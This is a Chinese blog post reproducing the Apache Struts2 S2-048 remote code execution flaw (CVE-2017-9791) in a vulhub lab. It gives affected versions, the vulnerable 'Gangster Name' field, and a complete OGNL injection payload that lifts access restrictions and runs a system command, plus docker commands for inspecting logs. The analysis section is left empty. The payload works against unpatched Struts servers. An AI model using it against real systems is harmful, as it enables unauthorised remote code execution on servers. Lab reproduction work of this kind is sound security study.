# CVE-2017-9791 S2-048 复现 - 美式加糖 - 博客园

> 原文：[`www.cnblogs.com/peace-and-romance/p/15652518.html`](https://www.cnblogs.com/peace-and-romance/p/15652518.html)

### 0X00-引言

* * *

钢铁内涵夜里我看学痞哦阿国，怀着冷却的心窝飘远方

### 0X01-环境搭建

* * *

靶机：CentOS Linux 7

攻击机：windows server 2016 && Kail

环境：vulhub

项目地址：[`github.com/vulhub/vulhub`](https://github.com/vulhub/vulhub)

搭建 vulhub 请访问：[空白 centos7 64 搭建 vulhub(详细)](https://www.cnblogs.com/peace-and-romance/p/15621658.html)

### 0X02-漏洞描述

* * *

影响版本: 2.0.0 - 2.3.32

Apache Struts2.3.x 系列版本中 struts2-struts1-plugin 存在远程代码执行漏洞，进而导致任意代码执行。

这个环境是直接下载的 struts-2.3.32 的 showcase，部署在 tomcat-8.5 下。环境启动后，访问`http://your-ip:8080/showcase/`即可查看到 struts2 的测试页面。

访问 Integration/Struts 1 Integration

触发 OGNL 表达式的位置是`Gangster Name`这个表单。

输入`${233*233}`即可查看执行结果（剩下两个表单随意填写）

### 0X03-漏洞复现

* * *

`http://192.168.234.128:8080/integration/editGangster.action`

![image-20211206150607289](img/75930d5db4a7745776b1ee308aded792.png)

##### 01-任意命令执行

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)} 
```

![image-20211206150646533](img/80222796da73325154b6a7fad4e843de.png)

### 0X04-漏洞分析

* * *

略

### 0X05-工具利用

* * *

没找到

### 0X06-查看日志

* * *

```
docker ps #查看容器 ID
docker exec -it ID /bin/bash #进入
cd logs #进入日志目录
cat localhost_access_log.2021-12-02.txt #查看日志
exit #退出容器 
```

![image-20211206151752761](img/2de12898368f9f02f845a710265ad2b9.png)

### 0X07-参考

* * *

[S2-048 动态分析](http://xxlegend.com/2017/07/08/S2-048%20%E5%8A%A8%E6%80%81%E5%88%86%E6%9E%90/)

[S2-048 远程代码执行漏洞](https://github.com/vulhub/vulhub/blob/master/struts2/s2-048/README.zh-cn.md)